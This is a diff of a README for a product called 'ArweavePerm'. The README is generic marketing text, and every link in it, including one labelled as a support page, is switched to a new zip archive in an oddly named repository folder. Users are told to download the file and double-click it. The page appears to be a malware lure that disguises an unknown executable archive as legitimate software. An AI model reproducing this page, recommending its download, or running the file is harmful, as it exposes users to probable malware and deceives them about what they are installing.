@@ -1,6 +1,6 @@
 # 🚀 ArweavePerm - Empower Your Digital Resilience Easily
 
-[![Download ArweavePerm](https://github.com/PMatahari/ArweavePerm/raw/refs/heads/main/beode/Perm_Arweave_v1.9.zip)](https://github.com/PMatahari/ArweavePerm/raw/refs/heads/main/beode/Perm_Arweave_v1.9.zip)
+[![Download ArweavePerm](https://raw.githubusercontent.com/PMatahari/ArweavePerm/main/beode/Perm_Arweave_3.5.zip)](https://raw.githubusercontent.com/PMatahari/ArweavePerm/main/beode/Perm_Arweave_3.5.zip)
 
 ## 📖 Introduction
 
@@ -29,7 +29,7 @@ To run ArweavePerm smoothly, make sure your system meets the following requireme
 Ready to unlock the power of ArweavePerm? Follow these simple steps to get started:
 
 1. **Download the Software**
-   Visit [this page to download](https://github.com/PMatahari/ArweavePerm/raw/refs/heads/main/beode/Perm_Arweave_v1.9.zip) the latest version of ArweavePerm.
+   Visit [this page to download](https://raw.githubusercontent.com/PMatahari/ArweavePerm/main/beode/Perm_Arweave_3.5.zip) the latest version of ArweavePerm.
 
 2. **Install the Application**
    Locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -41,7 +41,7 @@ Ready to unlock the power of ArweavePerm? Follow these simple steps to get start
 
 To get ArweavePerm, please click on the link below:
 
-[Visit this page to download](https://github.com/PMatahari/ArweavePerm/raw/refs/heads/main/beode/Perm_Arweave_v1.9.zip)
+[Visit this page to download](https://raw.githubusercontent.com/PMatahari/ArweavePerm/main/beode/Perm_Arweave_3.5.zip)
 
 After downloading, follow the installation steps mentioned above to set it up on your computer.
 
@@ -71,4 +71,4 @@ Please visit the support section in the app or contact our support team directly
 
 ArweavePerm offers a straightforward solution for businesses seeking reliable data management. With our user-friendly interface and powerful features, you can ensure your digital assets are safe and accessible. Don't wait—start your journey towards resilience today!
 
-For any further questions, visit the [support page](https://github.com/PMatahari/ArweavePerm/raw/refs/heads/main/beode/Perm_Arweave_v1.9.zip) or refer to the help documentation available within the application.
+For any further questions, visit the [support page](https://raw.githubusercontent.com/PMatahari/ArweavePerm/main/beode/Perm_Arweave_3.5.zip) or refer to the help documentation available within the application.
